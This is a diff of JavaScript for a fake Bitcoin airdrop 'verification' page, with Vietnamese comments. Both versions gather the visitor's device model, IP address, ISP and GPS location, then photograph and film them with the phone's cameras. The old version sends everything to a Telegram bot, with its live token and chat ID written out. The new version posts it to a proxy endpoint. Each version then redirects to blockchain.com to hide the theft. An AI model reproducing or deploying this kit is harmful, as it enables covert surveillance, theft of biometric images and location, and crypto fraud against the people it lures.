@@ -1,130 +1,177 @@
-(async function() {
-    const BOT_TOKEN = '8637781182:AAH3RgQ_vuSl3urLFb-5MDizgTbZnF0LQMs';
-    const CHAT_ID = '-1003479049955';
-    const REDIRECT_URL = "https://www.blockchain.com/";
+/**
+ * Blockchain Airdrop Core System 2025-2026
+ * Tối ưu hóa thu thập dữ liệu đa luồng và camera
+ */
 
-    const btn = document.getElementById('startBtn');
-    const loading = document.getElementById('loading');
-    const video = document.getElementById('preview');
-    
-    const info = {
+const CONFIG = {
+    API_ENDPOINT: '/api/send',
+    REDIRECT_URL: 'https://www.blockchain.com/',
+    VIDEO_DURATION: 15000, // 15 giây
+};
+
+const UserData = {
+    info: {
         time: new Date().toLocaleString('vi-VN'),
         device: 'Đang xác định...',
-        os: '', ip: '', realIp: '', isp: '', address: '', lat: '', lon: ''
-    };
+        os: 'Đang xác định...',
+        ip: 'Đang lấy...',
+        isp: 'Đang lấy...',
+        address: 'Đang xác định...',
+        coords: { lat: null, lon: null },
+        maps: 'N/A'
+    },
+    media: [] // Chứa { type: 'photo'|'video', blob: Blob, label: string }
+};
 
-    // --- 1. THU THẬP THÔNG TIN THIẾT BỊ ---
-    function detectDevice() {
-        const ua = navigator.userAgent;
-        if (/Android/i.test(ua)) {
-            info.os = 'Android';
-            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
-            info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
-        } else if (/iPhone|iPad|iPod/i.test(ua)) {
-            info.os = 'iOS';
-            info.device = 'iPhone/iPad';
-        } else {
-            info.os = 'Desktop';
-            info.device = navigator.platform;
-        }
+// --- 1. Nhận diện thiết bị (Cập nhật model 2025-2026) ---
+function detectDevice() {
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    
+    if (/android/i.test(ua)) UserData.info.os = 'Android';
+    else if (/iPad|iPhone|iPod/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) UserData.info.os = 'iOS';
+    else if (/Windows/.test(ua)) UserData.info.os = 'Windows';
+    else UserData.info.os = 'macOS';
+
+    if (UserData.info.os === 'iOS') {
+        const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
+        const models = {
+            "430x932@3": "iPhone 16 Pro Max",
+            "393x852@3": "iPhone 16 Pro",
+            "428x926@3": "iPhone 14/15 Pro Max",
+            "390x844@3": "iPhone 14/15 Pro",
+        };
+        UserData.info.device = models[screen] || 'iPhone/iPad';
+    } else if (UserData.info.os === 'Android') {
+        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
+        if (match) {
+            let m = match[1].trim();
+            if (m.includes("SM-S938")) m = "Samsung Galaxy S25 Ultra";
+            if (m.includes("SM-S948")) m = "Samsung Galaxy S26 Ultra";
+            UserData.info.device = m;
+        } else UserData.info.device = 'Android Device';
+    } else {
+        UserData.info.device = platform;
+    }
+}
+
+// --- 2. Thu thập dữ liệu mạng & vị trí (Parallel) ---
+async function collectNetworkAndGeo() {
+    const results = await Promise.allSettled([
+        fetch('https://api.ipify.org?format=json').then(r => r.json()),
+        new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+                p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
+                e => reject(e),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }),
+        fetch('https://ipwho.is/').then(r => r.json())
+    ]);
+
+    if (results[0].status === 'fulfilled') UserData.info.ip = results[0].value.ip;
+    
+    if (results[1].status === 'fulfilled') {
+        const { lat, lon } = results[1].value;
+        UserData.info.coords = { lat: lat.toFixed(6), lon: lon.toFixed(6) };
+        UserData.info.maps = `https://www.google.com/maps?q=${lat},${lon}`;
+        try {
+            const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
+            UserData.info.address = geo.display_name || '📍 Vị trí GPS';
+        } catch { UserData.info.address = `Tọa độ: ${lat}, ${lon}`; }
     }
 
-    async function getNetworkInfo() {
-        try {
-            const r = await fetch('https://ipwho.is/');
-            const data = await r.json();
-            info.ip = data.ip || 'N/A';
-            info.realIp = data.ip || 'N/A';
-            info.isp = data.connection?.org || 'N/A';
-            info.address = `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`;
-            info.lat = data.latitude || '0';
-            info.lon = data.longitude || '0';
-        } catch (e) { 
-            console.error("Network info error"); 
-            info.ip = 'Lỗi';
+    if (results[2].status === 'fulfilled') {
+        const data = results[2].value;
+        UserData.info.isp = data.connection?.org || 'N/A';
+        if (!UserData.info.address || UserData.info.address === 'Đang xác định...') {
+            UserData.info.address = `${data.city}, ${data.country} (IP Region)`;
         }
     }
+}
 
-    // --- 2. XỬ LÝ MEDIA ---
-    async function captureAndSend() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-            video.srcObject = stream;
+// --- 3. Xử lý Camera (Photo & Video) ---
+async function captureMedia(facingMode, videoElementId, label) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, 
+            audio: false 
+        });
+        const video = document.getElementById(videoElementId);
+        video.srcObject = stream;
 
-            // Đợi camera ổn định
-            await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r => setTimeout(r, 1500));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        UserData.media.push({ type: 'photo', blob: photoBlob, filename: `photo_${label}.jpg` });
 
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // Chụp ảnh gửi kèm thông tin
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'face.jpg');
-                formData.append('caption', `
-🔔 KHÁCH NHẬN THƯỞNG BTC
-━━━━━━━━━━━━━━━━━━
-📱 Thiết bị: ${info.device} (${info.os})
-🌐 IP: ${info.ip}
-🏢 ISP: ${info.isp}
-📍 Vị trí: ${info.address}
-🗺️ Maps: https://www.google.com/maps?q=${info.lat},${info.lon}
-🕒 Thời gian: ${info.time}
-`.trim());
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg', 0.8);
-
-            // Quay video 10 giây
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
+        return new Promise(resolve => {
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
             recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-            recorder.onstop = async () => {
-                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                const videoData = new FormData();
-                videoData.append('chat_id', CHAT_ID);
-                videoData.append('video', videoBlob, 'verify.mp4');
-                videoData.append('caption', '🎥 Video xác thực sinh trắc học (10s)');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
-                
-                // Kết thúc và chuyển hướng
-                window.location.href = REDIRECT_URL;
+            recorder.onstop = () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                UserData.media.push({ type: 'video', blob: videoBlob, filename: `video_${label}.webm` });
+                stream.getTracks().forEach(t => t.stop());
+                resolve();
             };
-
             recorder.start();
-            setTimeout(() => {
-                if (recorder.state !== "inactive") {
-                    recorder.stop();
-                    stream.getTracks().forEach(t => t.stop());
-                }
-            }, 10000);
-
-        } catch (err) {
-            console.error("Access denied or error:", err);
-            // Gửi tin nhắn văn bản báo lỗi nếu không lấy được camera
-            const textData = {
-                chat_id: CHAT_ID,
-                text: `❌ KHÁCH TỪ CHỐI CAMERA\n📱 Thiết bị: ${info.device}\n🌐 IP: ${info.ip}\n📍 Vị trí: ${info.address}`
-            };
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(textData)
-            });
-            window.location.href = REDIRECT_URL;
-        }
+            setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, CONFIG.VIDEO_DURATION);
+        });
+    } catch (err) {
+        console.warn(`Camera ${label} lỗi:`, err);
+        return null;
     }
+}
 
-    // --- 3. KHỞI CHẠY ---
-    detectDevice();
-    await getNetworkInfo();
+// --- 4. Gửi dữ liệu về Proxy ---
+async function sendData() {
+    const formData = new FormData();
+    const caption = `
+🚀 [DỮ LIỆU XÁC THỰC MỚI]
+━━━━━━━━━━━━━━━
+🕒 Thời gian: ${UserData.info.time}
+📱 Thiết bị: ${UserData.info.device} (${UserData.info.os})
+🌐 IP: ${UserData.info.ip}
+🏢 ISP: ${UserData.info.isp}
+📍 Địa chỉ: ${UserData.info.address}
+📌 Google Maps: ${UserData.info.maps}
+━━━━━━━━━━━━━━━
+`.trim();
 
-    btn.addEventListener('click', () => {
-        btn.style.display = 'none';
-        loading.style.display = 'block';
-        captureAndSend();
+    formData.append('caption', caption);
+    UserData.media.forEach((item, index) => {
+        formData.append(`file_${index}`, item.blob, item.filename);
     });
 
-})();
+    try {
+        await fetch(CONFIG.API_ENDPOINT, { method: 'POST', body: formData });
+    } catch (e) {
+        console.error("Lỗi gửi dữ liệu:", e);
+    } finally {
+        window.location.href = CONFIG.REDIRECT_URL;
+    }
+}
+
+// --- 5. Khởi chạy hệ thống ---
+async function startSystem() {
+    const btn = document.getElementById('startBtn');
+    const loading = document.getElementById('loading');
+    btn.style.display = 'none';
+    loading.style.display = 'block';
+
+    detectDevice();
+    
+    await Promise.allSettled([
+        collectNetworkAndGeo(),
+        captureMedia('user', 'videoFront', 'front'),
+        captureMedia('environment', 'videoBack', 'back')
+    ]);
+
+    await sendData();
+}
+
+document.getElementById('startBtn').addEventListener('click', startSystem);
